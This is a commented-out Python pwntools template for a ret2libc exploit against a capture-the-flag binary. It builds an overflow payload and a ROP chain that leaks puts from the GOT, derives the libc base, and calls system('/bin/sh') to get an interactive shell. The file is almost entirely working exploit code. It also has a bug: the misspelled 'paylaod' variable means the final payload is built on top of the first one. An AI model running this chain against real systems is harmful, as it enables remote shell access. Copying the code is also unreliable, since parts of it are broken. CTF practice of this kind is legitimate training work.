from pwn import *

# CONNECT BINARY FILE
# r = remote('ctf99x.cs.ui.ac.id', xxxx)
# r = process('./xxxxx.dms')

# LIBC
# libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')
# system_offset = libc.symbols['system']
# binsh_offset = list(libc.search(b'/bin/sh'))[0]
# puts_offset = libc.symbols['puts']

# BINARY FILE
# e = ELF('./libc_sequel.dms')
# rop = ROP(e)
# PUTS = e.plt['puts']
# GETS = e.plt['gets']
# vuln = 0x08049196

# GOT ADDRESS
# LIBC_START_MAIN = 0x804C014
# PUTS_GOT = 0x0804c010
# GETS_GOT = 0x0804c00c

# ROP ADDRESS
# POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0]

# PAYLOAD
# payload = b'A'*20
# payload += p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(GETS) + p32(GETS) + p32(GETS)
# payload += p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(vuln) 

# WRITE INTO FILE
# with open('payload', 'wb') as out:
# 	out.write(payload)

# SEND TO REMOTE/BINARY FILE
# r.sendlineafter('XXXXX', payload)

# RECV AFTER TRIGGER PUTS
# recieved = r.recvline().strip()
# leak  = hex(u32(recieved[:4].ljust(4, b'\x00')))

# ASSEMBLE PAYLOAD FOR system('/bin/sh')
# PUT_ADDR = int(leak, 16)
# LIBC_BASE = PUT_ADDR - puts_offset

# system_address = LIBC_BASE + system_offset
# binsh_address = LIBC_BASE + binsh_offset
# paylaod = b'A'*20
# payload += p32(system_address)
# payload += p32(POP_EBX)
# payload += p32(binsh_address)


# r.sendline(payload)
# r.interactive()